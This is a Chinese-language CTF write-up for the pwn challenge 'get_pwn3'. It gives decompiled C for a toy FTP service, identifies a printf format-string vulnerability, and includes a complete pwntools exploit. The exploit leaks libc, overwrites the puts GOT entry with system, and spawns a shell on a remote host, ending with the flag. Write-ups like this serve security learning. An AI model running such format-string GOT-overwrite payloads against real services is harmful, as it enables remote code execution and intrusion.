# get_pwn3

---

## 目录

[TOC]

---

## 逆向分析

首先是要求用户输入一个用户名，随后对输入的字符进行`+1`，随与`sysbdmin`进行比较，不相同程序退出

```C
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int command; // eax
  char s1[40]; // [esp+14h] [ebp-2Ch] BYREF
  int nop; // [esp+3Ch] [ebp-4h]

  setbuf(stdout, 0);
  ask_username(s1); //用户输入后对每个字符+1
  ask_password(s1); //与"sysbdmin"进行比较，既用户需要输入"rxraclhm"
  while ( 1 )
  {
    while ( 1 )
    {
      print_prompt();//打印printf("ftp>")
      command = get_command();//获取用户输入遂转成数字 get:1 put:2 dir:3
      nop = command;
      if ( command != 2 )
        break;
        //申请一个0xF4大小的heap，随后由用户输入当前段的名字和内容
        //名字可由 dir 打印，也可用于打印内容时作为判断的索引
        put_file();
    }
    if ( command == 3 )
    {
      //从heap中索引每个块的名字，拼接，遂使用puts打印出来
      show_dir();
    }
    else
    {
      if ( command != 1 )
        exit(1);
      //从heap中根据块名进行索引，并使用printf(content)将其打印，存在字符串格式化漏洞
      get_file();
    }
  }
}
```

### 总结

存在以下漏洞

- 格式化字符串

### 攻击思路

#### 利用格式化字符串篡改GOT

- 先泄露libc（申请的块名为;/bin/sh;）
- 篡改puts函数的got表
- 输入`dir`使其调用`show_dir`即可执行`puts(name)`

---

## 泄露libc并确定libc版本

由于题目并没有给出libc文件，所以需要我们自己去确认，使用格式化字符串泄露多个函数偏移，后使用工具下载匹配的libc文件，最终泄露和测试结果如下：

```css
===============『2023-06-07 23:24:54』===============
『puts』================>『0XF7679150』

===============『2023-06-07 23:26:18』===============
『strcmp』================>『0XF76AD7B0』

===============『2023-06-07 23:26:51』===============
『malloc』================>『0XF76232C0』

===============『2023-06-07 23:27:35』===============
『fread』================>『0XF7595D60』

===============『2023-06-07 23:28:52』===============
『LibcBase』================>『0XF7605000』
```

根据下载到的libc文件最终计算的`LibcBase = 0XF7605000`，找到libc

## Exploit

```python
from MUC.ezpwn import *

p,pb,libc = init(log="debug",arc="i386",b=32,r="123.59.196.133:10027")

password = "rxraclhm"
p.sendlineafter("Name (ftp.hacker.server:Rainism):",password)

def put(name,content):
    p.sendafter(b"ftp>",b"put")
    p.sendlineafter(b"please enter the name of the file you want to upload:",name)
    p.sendlineafter(b"then, enter the content:",content)

def get(name):
    p.sendafter(b"ftp>",b"get")
    p.sendlineafter(b"enter the file name you want to get:",name)

def dir():
    p.sendafter(b"ftp>",b"dir")

put(";/bin/sh;\x00",b"%8$s"+p32(pb.got["puts"])+p32(0))
get(";/bin/sh;\x00")
putsAddr = u32(p.recvuntil(b"\xf7")[-4:])
calcLibcBase("puts",putsAddr)
sysAddr = getFunc("system")

sH = (sysAddr >> 16) & 0xFFFF
sL = sysAddr & 0xFFFF
payload = f"%{sL}c%14$hn%{sH-sL}c%15$hn".ljust(28,"A")
payload = payload.encode() + p32(pb.got["puts"]) + p32(pb.got["puts"]+2)
put("pwn",payload)
get("pwn")
dir()

p.interactive()
#flag{67227981-49f1-40b5-8b3d-aa767bfe5c67}
```